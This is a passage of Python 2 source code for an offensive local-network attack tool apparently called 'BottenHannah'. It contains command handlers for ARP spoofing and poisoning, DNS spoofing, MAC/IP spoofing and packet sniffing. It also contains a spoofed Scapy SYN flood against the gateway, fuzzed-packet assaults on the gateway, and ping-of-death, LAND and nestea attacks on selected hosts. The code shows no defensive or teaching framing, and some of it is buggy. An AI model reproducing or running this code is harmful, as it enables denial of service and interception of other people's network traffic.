			self.comfm.append('m1', "m1syncflood")
			self.floodstate = True
	def frawscan(self,param):
		if param != []:
			if param[0] == 'stop': 
				if config.noise != 'silent': print("raw disabled")
				config.rawscan['rawscan'] = False
				if config.rawscan['rawarp'] == True: self.arpspoof('-r')
				config.rawscan['rawarp'] = False
				config.rawscan['rawlanhack'] = False
				config.rawscan['rawpoison'] = False
				config.rawscan['rawpool'] = -1
			else:
				for p in param:
					if p == '-p': 
						if config.noise != 'silent': print(colours.green+"enabled rawscan port"+colours.default)
						config.rawscan['rawscan'] = True
					elif p == '-a':
						if config.noise != 'silent': print(colours.green+"enabled rawarp"+colours.default)
						self.arpspoof('-s')
						config.rawscan['rawarp'] = True
					elif p == '-l':
						if config.noise != 'silent': print(colours.green+"enabled rawlanhack"+colours.default)
						config.rawscan['rawlanhack'] = True
					elif p == '-n':
						if config.noise != 'silent': print(colours.green+"enabled rawpoison"+colours.default)
						config.rawscan['rawpoison'] = True
					elif p[0:2] == '-o':
						if p[2:3].isdigit() and int(p[2:3]) in range(10):
							if config.noise != 'silent': print(colours.green+"enabled rawpool on pool "+ p[2:3]+colours.default)
							config.rawscan['rawpool'] = int(p[2:3])
	def gtwhack(self,param):
		self.comfm.append('m1', "m1hackgw")
		self.comfm.append('i6', "i6flood")
	def dnsspoof(self,param):
		if param != []:
			if param[0] == 'stop': 
				self.comfm.append('fc', "fcdnsspoofstop")
				self.dnsspoofstate = False
				print("dsn spoof stopped")
			elif param[0] == 'start': 
				self.comfm.append('fc', "fcdnsspoof")
				print(colours.green+"started dns spoof"+colours.default)
				self.dnsspoofstate = True
	def netspec(self,param):
		t = threading.Thread(target=netstart, args=(True,))
		t.start()
	def nettest(self):
		if config.netspecs.get_lan_ip(True) != config.oldip and config.netspecs.get_status()==True:
			print "IP changed was: "+colours.blue+config.oldip+colours.default+", now: "+\
				   colours.blue+config.netspecs.get_lan_ip(True)+colours.default
			print colours.on_magenta+"Reconfiguring"+colours.default
			config.ipnetwork = [ip for ip in IPNetwork(config.netspecs.get_network()+config.netspecs.get_mask_range())]
			t = threading.Thread(target=netstart, args=(True,))
			t.start()
		self.netstart = threading.Timer(2.0, self.nettest)
		self.netstart.start()
	def load(self):
		global config
		if param != [] and len(param) > 2:
			if param[0] == 'file':
				if param[1] == 'ips':
					if os.path.isfile(param[2]): 
						with open(param[2],'r') as r: lines = r.readlines()
						for l in lines:
							config.ipmacbuff.append([l])
			elif param[0] == 'db':
				print "not implemented yet"
	def changeim(self,param):
		global SPOOFIP,SPOOFMAC
		if param != []:
			if param[0].isdigit() and int(param[0]) < len(config.ipmac):
				SPOOFIP = config.ipmac[int(param[0])][0]
				SPOOFMAC = config.ipmac[int(param[0])][1]
			elif param[0]=='rand':
				SPOOFIP = randip()
				SPOOFMAC = randmac()
				print('Your new random IP: '+colours.blue+SPOOFIP+colours.default+\
						" Your new MAC: "+colours.blue+SPOOFMAC+colours.default)
			elif param[0]=='def':
				SPOOFIP = config.netspecs.get_lan_ip()
				SPOOFMAC = config.netspecs.get_mac()
				print('Your IP and MAC are back to default')
	def sniff(self,param):
		if param != []:
			if param[0] == 'start': self.comfm.append('ss', "ssstart")
			elif param[0] == 'stop': self.comfm.append('ss', "ssstop")
			elif param[0] == 'count':self.comfm.append('ss', "sscount")
			elif param[0] == 'monitor' and len(param) == 2:
				self.comfm.append('ss', "ssarpmonitor", param[1])
			elif param[0] == 'select' and len(param) == 3: 
				self.comfm.append('ss', "ssselect", param[1],param[2])
			elif param[0] == '*':	
				if len(param) == 1: 
					self.comfm.append('ss', "sssummary",'*')
				elif len(param) == 2: 
					self.comfm.append('ss', "sssummary",param[1])
				elif len(param) == 3:
					self.comfm.append('ss', "sssummary",param[1],param[2])
			elif param[0] in ('**','***'):
				self.comfm.append('ss', "sssummary",param[0])
			elif param[0]=='show' and len(param)>1 and param[1].isdigit(): 
				self.comfm.append('ss', "ssshow", param[1])
			elif param[0] == 'filter' and len(param)>1: self.comfm.append('ss', "ssfilter", param[1])
			elif param[0] == 'num' and len(param) > 1 and param[1].isdigit(): 
				self.comfm.append('ss', "ssnumber",param[1])
			elif param[0] == 'maxas' and param[1].isdigit(): self.comfm.append('ss', "ssmaxautosave",param[1])
			elif param[0] == 'save': self.comfm.append('ss', "sssave")
			elif param[0] == 'view': self.comfm.append('ss', "ssview")
			elif param[0] == 'flist' and len(param) > 1:
				if len(param) > 2 and param[1] == 'add' and int(param[2]) in range(10) and self.ipmacpool[int(param[2])] != []:
					pool = self.ipmacpool[int(param[2])]
					macs = []
					for i in range(len(pool)):
						macs.append(pool[i][1])
				 	self.comfm.append('ss', "ssflist",'add','|'.join(macs))
				elif param[1] == 'clear':
					self.comfm.append('ss', "ssflist", 'clear')			
	def sockets(self,param):
		msg='sockets'
		if param != []:
			if param[0]=='-q':msg='quit'
			else: msg=param[0]
		t = threading.Thread(target=client,args=(msg,))
		t.start()
	def showports(self,param):
		for i in range(len(self.ports)):
			for x in range(len(self.ports[i])):
				if x == 0:
					print '\n*****[ ', surround_print(self.ports[i][x] + ' ]', '*',padding=20),'\n'
				else:
					for y in range(len(self.ports[i][x])):
						if y == SN and self.ports[i][x][y] != ['']: print 'TCP syn:\t' + ' | '.join(self.ports[i][x][y])
						elif y == AK and self.ports[i][x][y] != ['']:  print 'TCP ack:\t' + ' | '.join(self.ports[i][x][y])
						elif y == UP and self.ports[i][x][y] != ['']:  print 'UDP:\t\t' + ' | '.join(self.ports[i][x][y])
						elif y == FW and self.ports[i][x][y] != ['']:  print 'Firewall:\t' + ' | '.join(self.ports[i][x][y])
	def sort(self,param):
		global config
		if param != []:
			if param[0] == 'ip': 
				config.ipmac = sortIPs(config.ipmac)
			elif param[0] == 'clock': 
				config.ipmac.sort(key=lambda x: x[2])
				config.ipmac.reverse()
			if param[0] in ('ip','clock') and self.sorted != param[0]:
				self.sorted = param[0]
				if config.noise != 'silent': print("sorted by "+param[0])
	def selparam(self,param):
		if len(config.ipmac)>1 and param is not None:
			if param != []:
				for p in param:
					if p in ('*','!*'):
						if len(config.ipmac) > 0:
							if p[0] == '*':
								self.ipmacsel = []
								for i in range(len(config.ipmac)):
									self.ipmacsel.append([config.ipmac[i][0], config.ipmac[i][1]])
								if config.noise != 'silent': print("selected all")
							else: 
								print("removed all selected")
								self.ipmacsel = []
					elif p[0]=='<' or p[0]=='&':
						poolno = p[1:]
						if poolno.isdigit() and int(poolno) in range(10) and \
						self.ipmacpool[int(poolno)] != None:
							print "selected pool", poolno
							for i in range(len(self.ipmacpool[int(poolno)])):
								if not in2d(self.ipmacpool[int(poolno)][i][0],self.ipmacsel):
									self.ipmacsel.append([self.ipmacpool[int(poolno)][i][0], \
											     self.ipmacpool[int(poolno)][i][1]])
							if p[0]=='&': self.ipmacpool[int(poolno)] = []
					elif p[0]=='>':
						poolno = p[1:]
						if poolno.isdigit() and int(poolno) in range(10) and self.ipmacsel != None:
							self.pool(['sel2', poolno])
					elif re.match(r'^!?[0-9]{1,}-[0-9]{1,}$',p) != None or re.match(r'^!?[0-9]{1,}$',p) != None\
					 or p == '*' or re.match(r'^[0-9]{1,3}%(\/[0-9]{1,})?$',p) != None \
					 or re.match(r'^!?[0-9]{1,}$',p) != None or re.match(r'^randip-[0-9]{1,}$',p)\
					 or re.match(r'^[+-][0-9]{1,}$',p):
						if 'randip' in p:
							rnd = -1
							num = p[7:]
							if int(num)<len(config.ipmac): 
								for i in range(int(num)):
									while rnd == -1: #or rnd in self.ipmac[]:
										random.seed()
										rnd = random.randint(0,len(config.ipmac)-1)
									if not in2d(config.ipmac[i][0],ipmacsel):
										self.ipmacsel.append(config.ipmac[rnd][0],\
										config.ipmac[rnd][1])
								print('selected '+num+' random ips')
						elif '-' in p[0]:
							print "help"
							nmin = int(p[1:])
							if nmin < len(config.ipmac):
								for i in range(nmin):
									if not in2d(config.ipmac[i][0],self.ipmacsel):
										self.ipmacsel.append([config.ipmac[i][0],\
										 config.ipmac[i][1]])
								print("selected "+ str(nmin)+" ips")
						elif findchar(p, '-') == True:
							flag = 0
							if p[0]=='!': 
								p = p[1:]
								flag = 1
							fn = '-'.join(p.split('-')[0:1])
							ln = '-'.join(p.split('-')[1:2])
							if int(fn) < int(ln):
								if((flag == 1 and int(ln)<len(self.ipmacsel))\
								or (int(ln) < len(config.ipmac) and flag==0)):
									if flag == 0: print('selected'),
									else: print('unselected')
									for i in range(int(fn),int(ln)+1):
										if flag == 1: 
											self.ipmacsel.pop(int(fn))
										elif not in2d(config.ipmac[i][0],self.ipmacsel): 
											self.ipmacsel.append([config.ipmac[i][0],\
											config.ipmac[i][1]])
										print(i),'|',
									print('')
						elif p[0]=='+':
							num = int(p[1:])
							if num < len(config.ipmac):
								nmax = len(config.ipmac)
								for i in range(num, nmax):
									if not in2d(config.ipmac[i][0],self.ipmacsel):
										self.ipmacsel.append([config.ipmac[i][0],\
										config.ipmac[i][1]])
								print 'added', num, 'to', nmax
						elif findchar(p, '%'):
							num = int(p[0:p.find('%')])
							nb = int(math.ceil(len(config.ipmac)*num/100))
							if p.find('/') > 0:
								endw = int(p[p.find('/')+1:])*nb
								startw = endw - nb
								for i in range(int(startw), endw):
									if not in2d(config.ipmac[i][0],self.ipmacsel):
										self.ipmacsel.append([config.ipmac[i][0],\
										config.ipmac[i][1]])
								print 'selected '+p[p.find('/')+1:]+'th '+str(num)+'%'
							else:
								for i in range(nb):
									if not in2d(config.ipmac[i][0],self.ipmacsel): 
										self.ipmacsel.append([config.ipmac[i][0],\
										config.ipmac[i][1]])
								print 'selected',str(num)+'%'
						else: 
							if p[0]=='!':
								if(len(self.ipmacsel)>int(p[1:])):
									self.ipmacsel.pop(int(p[1:]))
									print("removed "+p[1:])
							else: 
								if len(config.ipmac)>int(p):
									if not in2d(config.ipmac[int(p)][0],self.ipmacsel):
										self.ipmacsel.append([config.ipmac[int(p)][0], \
										config.ipmac[int(p)][1]])
									print("selected "+p)
				#self.selectips = unique(self.selectips)
	def ansserv(self,data = None):
		global config
		copydatas = data[:]
		for data in copydatas:
			if data != None:
				if data[0:3] == '{p}':
					isyn = data.index('{'+str(SN)+'}')
					ip = data[3:isyn]
					if not in2d(ip,self.ports):
						ports = [[] for x in range(4)]
						#if ports found
						iack = data.index('{'+str(AK)+'}')
						iudp = data.index('{'+str(UP)+'}')
						ifrw = data.index('{'+str(FW)+'}')
						ports[SN] = data[isyn+3:iack].split('|')
						ports[AK] = data[iack+3:iudp].split('|')
						ports[UP] = data[iudp+3:ifrw].split('|')
						ports[FW] = data[ifrw+3:].split('|')
						self.ports.append([ip, ports])
						self.lanscancount[0]=self.lanscancount[0]+1
						if self.lanscancount[0]>=self.lanscancount[1]:
							self.lanscancount = [0,0]
				elif data[0:3] == '{n}':
					im = data[3:].split('|')
					im = im[:-1]
					for i in range(0, len(im), 4):
						kind = 'IPv4' if im[i] != '' else 'IPv6'
						config.insert_ipmac([im[i], im[i+1],im[i+2], im[i+3]], kind)
				elif data[0:3] == '{x}':
					im = data[3:].split('|')
					im = im[:-1]
					for i in im:
						config.ipmac.pop(findindex(i, config.ipmac))
						config.ipnetwork.append(i)
			config.datas = config.datas[len(copydatas):]
	def answer(self, cmd = None): #Arguments sent to cyborg 'c)argmument param' 
		if cmd != None:
			fcmd = cmd			
			if config.noise == 'loud': print('Cyborg says:', fcmd.replace('\n', ''))
			cmd, param = parse_params(fcmd)
			if self.state == 'loaded':#Cyborg loaded (precommands)
				print "",
			elif self.state == 'started':#Cyborg started
				if cmd in ('hello','hi','hola','salut'): print("Hi my name is BottenHannah")
				elif cmd == 'readlist': self.readlist()
				elif cmd == 'sleep': 
					if param != []: time.sleep(float(param[0]))
				elif cmd == 'pool': self.pool(param)
				elif cmd == 'showips': self.showIPs(param)
				elif cmd == 'showselip':self.showSelIPs()
				#elif cmd == 'insertdb':self.insertIntoDb()
				elif cmd == 'select': self.selparam(param)
				elif cmd == 'netspec': self.netspec(param)
				elif cmd == 'printnetspec': config.netspecs.tostr()
				#elif cmd == 'parsedb': self.parseDB()
				elif cmd == 'sockets':self.sockets(param)
				elif cmd == 'enter': self.processors.broadcast("enter")
				elif not config.netspecs.get_lan_ip() == config.localhost: #not in localmode
					if cmd == "showstatus": self.showstatus()
					elif cmd == 'load': self.load(param)
					elif cmd == 'arpspoof': self.arpspoof(param)
					elif cmd == 'arppool':self.arppool(param)
					elif cmd == 'arppoison':self.arppoison(param)
					elif cmd == 'lanhack': self.lanhack(param)
					elif cmd == 'lanscan': self.lanscan(param)
					elif cmd == 'kill': self.kill(param)
					elif cmd == 'flood':self.flood(param)
					elif cmd == 'rawscan': self.frawscan(param)
					elif cmd == 'gtwhack':self.gtwhack(param)
					elif cmd == 'arping': self.arping(param)
					elif cmd == 'dnsspoof':self.dnsspoof(param)
					elif cmd == 'sniff': self.sniff(param)
					elif cmd == 'packet': self.packet(param)
					elif cmd == 'showports': self.showports(param)
					elif cmd == 'changeim': self.changeim(param)
					elif cmd == 'sort': self.sort(param)
				else: print(colours.red+"Canno\'t use cyborg you are offline"+colours.default)
		else: return
		return cmd

def murgeip4_6(event):
	while not event.isSet():
		global config
		copy = config.ipmac[:]
		ln = len(copy)
		if copy != '' and copy != []:
			for i in range(0, len(copy)):
				mac1 = copy[i][1]
				for x in range(i+1, len(copy)-i-1):
					mac2 = copy[x][1]
					if mac2 == mac1 and mac1 != '00:10:f3:32:c1:5d':
						if copy[i][0] == '': copy[i][0] = copy[x][0]
						elif copy[i][3] == '': copy[i][3] = copy[x][3]
						config.remove_ipmac(copy[x])
						break
			config.ipmac = config.ipmac[ln:]
			config.ipmac.extend(copy)
			#put solo ip6 at the end
			for i in range(len(config.ipmac)):
				if config.ipmac[i][0] == '':
					temp = config.ipmac.pop(i)
					config.ipmac.insert(len(config.ipmac), temp)
		time.sleep(0.5)

########################[ PROCESSOR ]#########################

class processors():
	state = None
	NUM_PROC = config.parts
	def __init__(self):
		self.processors = [None for x in range(self.NUM_PROC)]
		self.events = [None for x in range(self.NUM_PROC)]
		self.state = 'Init'
		self.procstate = ['stopped' for x in range(self.NUM_PROC)]
		self.procname = [None for x in range(self.NUM_PROC)]
		self.loaded = 0.00	
	def start(self,pos):
		global config
		if self.procstate[pos] != 'started':
			if self.procstate[pos] == 'stopped':
				 self.initialise(pos)
			self.loaded += 1.00
			if config.noise != 'silent':
				towrite = '\r'+str(round(((self.loaded / config.parts)*100),2))+'% - '+self.procname[pos]
				sys.stdout.write('\r' + towrite + '\n')
				sys.stdout.flush()
			self.processors[pos].start()
			self.procstate[pos]='started'
			if config.parts == int(round(self.loaded)):
				if config.noise != 'silent': 
					sys.stdout.write('\r'+colours.on_magenta + "Cyborg parts started" + colours.default+'\n')
				config.status = 'FULLSTART'
	def broadcast(self,msg):
		global config
		for i in range(self.NUM_PROC):
			config.comfm.append(config.name[i], msg)
	def getstatus(self): return self.procstate
	def stop(self,pos):
		global config
		if self.procstate[pos] == 'started':
			self.events[pos].set()
			if config.process[config.name[pos]]['type']=='processor':
				time.sleep(0.1)
				self.processors[pos].terminate()
				if config.noise == 'talk': 
					print "multi-process", pos, "shutdown"
			elif self.processors[pos].isAlive(): self.processors[pos].join()
			self.processors[pos] = None
			self.procstate[pos] = 'stopped'
		elif self.procstate[pos] == 'loaded':
			self.processors[pos] = None
			self.procstate[pos] = 'stopped'
			config.pthreads-=1
	def startall(self):
		for i in range(self.NUM_PROC):
			self.start(i)
	def restart(self,pos):
		self.stop(pos)
		self.start(pos)
	def initialise(self,pos):
		self.events[pos] = threading.Event()
		self.procname[pos] = config.process[config.name[pos]]['name']
		name = config.name[pos]
		if config.process[name]['type'] == 'processor':
			self.processors[pos] = Process(target=process_core, args=(self.events[pos], pos))
		elif config.process[name]['type'] == 'thread':
			self.processors[pos] = threading.Thread(target=process_core, args=(self.events[pos], pos), name=name)
		self.procstate[pos]='loaded'
	def stopall(self):
		with open("ec.bota","w") as ec: ec.write("")
		if config.noise != 'silent': print("wait while stopping multi-process")
		for i in range(self.NUM_PROC):self.stop(i)
		if config.noise == 'talk': print("threads stopped")
		os.remove("ec.bota")
	def configure_processor(self):
		for i in range(self.NUM_PROC): self.initialise(i)		


class run(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.name="Server_Tunel"
	def run(self):
		global config
		while config.message["mine"][0] == None:
			for k, v in config.message.iteritems():
	   			if k == "broadcast" and (config.message["broadcast"][0] != None or len(config.message["broadcast"]) > 1):
					tmsg = config.message["broadcast"][1:]
					for x in range(0, len(tmsg)):
						config.server.broadcast(tmsg[x])
					config.message["broadcast"] = config.message["broadcast"][:-len(tmsg)]
				elif k in config.name and (config.message[k][0] != None or len(config.message[k]) > 1):
					tmsg = config.message[k][1:]
					for x in range(0, len(tmsg)):
						config.server.sendto(k, tmsg[x])
					config.message[k] = config.message[k][:-len(tmsg)]
			msg = config.server.run()
			if msg not in ['c','q', None]:
				if msg[0] == '[' and msg[3]==']':
					config.server.sendto(msg[1:3], msg[4:])
				else: config.datas.append(msg)
			time.sleep(0.003)
		config.server.stop()

########################[ PARTS OF CYBORG ]#########################

class parts():
	def __init__(self, plan=1):
		e = threading.Event()
		self.plist=[]
		self.elist=[]
		self.plist.append(headQuarter(e, plan))
		self.elist.append(e)
	def start(self): [ t.start() for t in self.plist ]
	def stop(self): [ e.set() for e in self.elist ]

typeplan = {'local':0, 'offline':1, 'pingworld':2,'procedure':3,'init':4}

#AI OF THE CYBORG
class headQuarter(threading.Thread):
	init = None
	initfile = 'init.bota'
	def __init__(self, e, step):
		threading.Thread.__init__(self)
		self.init = "started"
		self.event = e
		self.name = "headQuarter"
		self.step = step
		if config.noise == 'talk': print self.name, 'loaded in memory'
		self.step = 4		
		self.set_default()
		self.command()
	def command(self):
		if self.step == typeplan['local']: #local arp all
			return
		elif self.step == typeplan['offline']:
			return
		elif self.step == typeplan['pingworld']:
			return
		elif self.step == typeplan['procedure']:
			if os.path.isfile(config.procedure):
				f = open(config.procedure, 'rw')
				flines = f.readlines()
				f.close()	
				for fline in flines:
					fl = fline.replace('\n','')
					commands = fl.split('|')
					write_command(commands)
					self.step = 2			
				cyborgReadList()
			else: sys.exit()
		elif self.step == typeplan['init']:
			self.step=2
	def set_default(self):
		if os.path.isfile('list.bota'):
			os.remove('list.bota')
		if os.path.isfile('eap.bota'):
			os.remove('eap.bota')	
	def run(self):
		if config.noise == 'talk': print self.name, 'started'
		if config.procedure is not None:
			self.step = typeplan['procedure']
			if config.noise != 'silent': print('file command engaged: '+config.procedure)
		while not self.event.isSet():
			self.command()
			time.sleep(config.sleep)
		with open("eap.bota",'w') as eap: eap.write('')
		if config.noise == 'talk': print self.name, 'stopped'



def process_core(e=None, pos=None):
	global config, tunel
	name = config.name[pos]
	func = config.process[name]['func']
	sleep = config.process[name]['sleep']
	com = communicate(name, 'multiline')
	client = tunel.get_client("tunel1", name)
	client.connect()
	time.sleep(0.2)
	process = func(pos, name, com, client)
	cmd = None
	while not os.path.isfile("ec.bota"):
		process.run()
		time.sleep(sleep)
	process.stop()


########################[ PROCESSORS CORE ]#########################

#NETWORK GLOBAL ATTACKS
class multiprocess_core1():
	def __init__(self, pos, name, com, client):
		self.pos = pos
		self.events = []
		self.subservices = []
		self.communicate = com
		self.name = name
		self.flood = False
		self.client = client
	def run(self):
	#garbage threads
		[self.subservices.pop(self.subservices.index(s)) for s in self.subservices if not s.isAlive()]
		self.answer(self.communicate.listen())
		self.answer([self.client.run()])
	def stop(self):
		if self.events != []: [e.set() for e in self.events]
		if config.noise == 'talk': print "Processor1 shutdown"
	def answer(self,cmd=None):
		if cmd is not None and cmd != ['c']:
			for c in cmd:
				c, param = parse_params(c)
				if c == 'm1hackgw': 
					ip = config.netspecs.get_gateway()
					if config.noise != 'silent': print("sending ipv4 problematic packets")
					pktm.spool(pktm.fuzz_dns(ip), 10)
					pktm.spool(pktm.fuzzNTP(ip), 10)
					pktm.spool(pktm.fuzzTCP(ip), 10)
					pktm.spool(pktm.frameinject(), 10)
					pktm.spool(pktm.rogueinject(), 10)
					#Thread(mp1(ip)),
					#Thread(mp2(ip)),
					pktm.spool(pktm.dnsQuery(ip), 10)
					pktm.spool(pktm.fuzz_mac(), 10)
					pktm.spool(pktm.fuzz_hsrp(ip), 10)
				elif c == 'm1syncflood':
					if flood == False:
						flood = True
						e = threading.Event()
						t = threading.Thread(target=syncflood, args=(e,))
						self.subservices.append(t)
						t.start()
						self.events.append(e)
						if config.noise != 'silent': print(colours.green+"started packet flooder"+colours.default)
				elif c == 'm1sfstop':	
					flood = False
					[e.set() for e in self.events]
					self.events = []
					self.subservices = []
					if config.noise != 'silent': print("stopped packet flooder")
				elif c == 'm1new': 
					if config.noise == 'talk': print 'lanhack on ',param[0]
					t = subcore(param[0],param[1])
					self.subservices.append(t)
					t.start()

def syncflood(e):
	pkt=Ether(src=SPOOFMAC)/IP(src=SPOOFIP,dst=config.netspecs.get_gateway(),id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12,ack=1000,window=1000,flags='S',options=[('Timestamp', (10,0))])/'-BottenHannah- flooding'
	while not e.isSet():
		pktm.spool(pkt,20)
		time.sleep(1)

#SUBCORE
class subcore(threading.Thread):
	def __init__(self, ip, mac,name="subcore"):
		threading.Thread.__init__(self)
		self.name = name
		self.stop = False
		self.ip = ip
		self.func = []
		self.mac = mac
	def run(self): 
		ip = self.ip
		mac = self.mac
		if config.noise == 'talk': print self.name, "running...", ip, mac
		pktm.spool(pktm.c1pingofdeath(ip,mac), 10) 
		pktm.spool(pktm.c1landattack(ip,mac), 10)
		pktm.spool(pktm.c1nesteaattack(ip,mac), 10)
		pktm.spool(pktm.c1mp(ip,mac), 10) 
		pktm.spool(pktm.c1ipattack(ip,mac), 10)
		if config.noise == 'talk':
			print self.name, "stopped", ip, mac


#NETWORK SCANNER
class multiprocess_core2():
	def __init__(self, pos, name, com, client):
		global mesuring, tot_pourcent, lastip, bmeter,bmeterp
		mesuring = 0
		tot_pourcent = 0
		lastip = config.localhost
		bmeter = False
		bmeterp = False
		self.pos = pos
		self.arpingmode = ''
		self.pingext = False
		self.mask = '/24'
		self.maximum = 1
		self.arpingstate = False
		self.arpscanner = None
		self.tot_pourcent = 0
		self.arpre = False
		self.communicate = com
		self.name = name
		self.event = threading.Event()
		self.eventm = None
		self.threads = []
		self.arpingmodetemp = ''
		self.darpscanner = False
		self.nbconnected = 0
		self.client = client
		t = threading.Thread(target=imhandler, args=(self.event, self.client, ))
		self.threads.append(t)
		t.start()
	def stop(self):
		if self.event != None: self.event.set()
		if self.eventm != None: self.eventm.set()
		if config.noise == 'talk': print "Processor2 shutdown"
	def run(self): 
		self.answer(self.communicate.listen())
		self.answer([self.client.run()])
	def answer(self,cmd=None):
		if cmd is not None and cmd != ['c']:
			for c in cmd:				
				c, param = parse_params(c)
				if c == 'm2scan': 
					self.arping(param)
				elif c == 'enter':
					global bmeter, bmeterp
					bmeter = False
					bmeterp = False
				elif c[0:4] == '[i4]':
					im = c[4:].split('|')
					im = im[:-1]
					for i in range(0, len(im), 2): config.ipmacbuff.append([im[i], im[i+1]])
				elif c[0:4] == '[i6]':
					im = c[4:].split('|')
					im = im[:-1]
					for i in range(0, len(im), 2): config.ip6macbuff.append([im[i], im[i+1]])
	def parallel(self):
		global bmeter, bmeterp
		self.eventm = threading.Event()
		bmeterp = True if '-p' in self.arpingmode else False
		bmeter = True if '-m' in self.arpingmode else False
		t = threading.Thread(target=mesure, args=(self.eventm, self.maximum,))
		self.threads.append(t)
		t.start()
	def initialise(self):
		dtnow = datetime.now()
		now = dtnow.strftime("%I:%M:%S%p")
		self.nbconnected = len(config.ipmac)
		if not '-l' in self.arpingmode and not '-k' in self.arpingmode and '-r' not in self.arpingmode: 
			config.ipmacclock = config.ipmac 
			config.ipmac = []
		mode = self.arpingmode.split('|')
		if self.arpingmode.find('-r') == -1:
			if self.arpingmode.find('/') != -1:
				nbhost = config.netspecs.get_nb_hosts_mask(self.mask)
			else: nbhost = 256
			nbhostm = config.netspecs.get_nb_hosts()
			if [m for m in mode if m.isdigit()] != []:
				nbthread = int([m for m in mode if m.isdigit()][0])
			else: nbthread = 1
			if self.arpingmode.find('s') != -1:
				nbtime = int([m[:-1] for m in mode if m.find('t')!=-1][0])
			else: nbtime = 1
			if self.arpingmode.find('%') != -1:
				nbpourc = int([m[:-1] for m in mode if m.find('%')!=-1][0])
				nbpourc = 1-float(nbpourc)/100
			else: nbpourc = 1
			m, s = divmod((nbhostm / ((nbhost * nbthread) / nbtime)) * nbpourc * 1.4 + (nbthread*6) + (100*nbpourc), 60)
		else:
			time = 1 if len(config.ipmac) <30 else float(len(config.ipmac)/30)
			m, s = divmod(time, 60)
		if '-q' not in self.arpingmode:
			word = 'rearping' if self.arpingmode.find("-r") != -1 else 'arping' 
			print colours.green+"started "+word+" at "+now+" execution time about %02d:%02d minutes" % (m,s)+colours.default
	def arping(self, param):
		global tot_pourcent, config
		if self.arpingstate == False:
			if os.path.isfile("eap.bota"): os.remove("eap.bota")
			if param != []:
				if 'start' in param:
					self.arpingmode = ''
					for p in param:
						if ('/' in p and p[-1:].isdigit()) or p.isdigit()\
						 or p in ('-i', '-p', '-m', '-l','-k','-q', '-r', '-e')or (((p[-1:]=='%' and p[:-1].isdigit()) \
						 or p[-1:]=='s') and p[:-1].isdigit()) or (p[0:1] == '*' and p[1:].isdigit())\
				         or (re.match(r'^([0-9]{1,3}[*]?.){3}[0-9]{1,3}(/[0-9]{1,2})?$', p) and countoccur(p, '*') <= 1)\
						 or p in ('udp','tcp', 'icmp'):
							if self.arpingmode != '': self.arpingmode += '|'+p
							else: self.arpingmode = p
					mark = re.search(r'([0-9]{1,3}[*]?.){3}[0-9]{1,3}(/[0-9]{1,2})?', self.arpingmode)
					if mark: 
						grp = mark.group()
						self.pingext = True
						self.mask = grp[grp.find("/"):] if grp.find("/") != -1 else "/32"
					else: self.mask = config.netspecs.get_mask_range()
					if '-r' in self.arpingmode: self.maximum = self.nbconnected
					else: self.maximum = config.netspecs.get_nb_hosts() if not self.pingext\
				    else config.netspecs.get_nb_hosts_mask(self.mask)
					if self.arpingmode != '':  print "mode: "+ self.arpingmode.replace("|", " ")
					if '-r' in self.arpingmode: 
						self.arpscanner = arpscanner(self.arpingmode, config.ipmac)
					elif '-l' in self.arpingmode: 
						self.arpscanner = arpscanner(self.arpingmode,None,self.lastip)
						print 'finding '+self.lastip
					else: self.arpscanner = arpscanner(self.arpingmode)
					config.toread = ''
					self.arpscanner.start()
					self.arpingstate = True
					self.initialise()
					self.parallel()
				if '-d' in param:
					self.arpingmode = ''
					print("arping mode reset")
		elif self.arpingstate == True:
			dtnow = datetime.now()
			now = dtnow.strftime("%I:%M:%S%p")
			if 'stop' in param:
				with open("eap.bota",'w') as eap: eap.write('')
				if config.noise != 'silent' and '-q' not in self.arpingmode:
					towrite = str(len(config.ipmac))
					print "scanner done at "+now+"\nthere is",towrite,"connected on the network"
				if '-q' not in self.arpingmode:
					if tot_pourcent != 0:
						if self.arpingmode.find('-r')==-1:
							print "you scanned "+str(tot_pourcent)+"% of the network"
						else: print "you scanned "+str(tot_pourcent)+"% of the ips"
				tot_pourcent = 0
				self.arpscanner = None
				self.arpingstate = False
				self.darpscanner = True
				self.eventm.set()
				self.eventm = None
				if '-i' in param:
					if '-i' in self.arpingmode:
						if self.arpre == 0 or self.arpre == False:
							self.arpingmodetemp = self.arpingmode
							mode = self.arpingmode.split('|')
							mode.append('-r')
							mode = [m for m in mode if m.find('%')==-1]
							self.arpingmode = '|'.join(mode)
							self.arpre = True
						elif self.arpre == True: 
							self.arpingmode = self.arpingmodetemp
							self.arpre = False
						mode = ['start'] + self.arpingmode.split('|')
						self.arping(mode)
				else: self.arpingmode = ''
			elif '-m' in param:
				word = 'ips' if '-r' in self.arpingmode else 'network'
				print colours.on_blue+"scanned "+str(tot_pourcent)+"% of the "+word+" at "+\
					  now+colours.default
			elif 'clear' in param:
				self.arpingmode = ''
				print("arping mode reset")
			elif 'mode' in param: print self.arpingmode.replace('|', ' ')
			
def mesure(event, maximum):
	global mesuring, tot_pourcent, bmeter
	while not event.isSet():
		tot_pourcent = round(float(mesuring)/maximum*100, 2)
		if bmeter == True:
			if config.toread == 'enter': bmeter = False
			else:
				towrite = "\rDiscovered %(tot_pourcent).2f%% (%(mesuring)02d / %(maximum)02d)" % \
				{'tot_pourcent': tot_pourcent, 'mesuring':mesuring, 'maximum': maximum}
				sys.stdout.write(colours.on_blue + towrite + colours.default)
				sys.stdout.flush()
		time.sleep(0.03)
			
def imhandler(event, client):
	global config, lastip, bmeterp
	network = config.netspecs.get_network() + config.netspecs.get_mask_range()
	while not event.isSet():
		time.sleep(0.005)
		if len(config.ipmacbuff)>0:
			buff = list(config.ipmacbuff)
			if buff != []:
				#ip4
				toclient = '{n}'
				for i in range(len(buff)):
					if buff[i][0] != config.netspecs.get_lan_ip():
						if len(buff[i])==1: buff[i].append('00:10:f3:32:c1:5d')
						buff[i].append(config.reclock(buff[i][0],buff[i][1]))
						buff[i].append('')
						if config.insert_ipmac(buff[i],'IPv4') == True:
							toclient += buff[i][0]+'|'+buff[i][1]+'|'+str(round(buff[i][2],2)) + '|'+buff[i][3]+'|'
						if bmeterp: print '\r' + buff[i][0] + ' | ' + buff[i][1] + '\t'
				if toclient != '{n}': client.send(toclient)
				if len(buff)>0: lastip = buff[len(buff)-1][0]
				if config.rawscan['rawscan'] or config.rawscan['rawpool'] != -1 or config.rawscan['rawlanhack'] or config.rawscan['rawarp'] or config.rawscan['rawpoison']:
						ips = []
						macs = []
						for i in range(len(buff)):
							if buff[i][0] != config.netspecs.get_lan_ip() and buff[i][0] != config.netspecs.get_gateway():
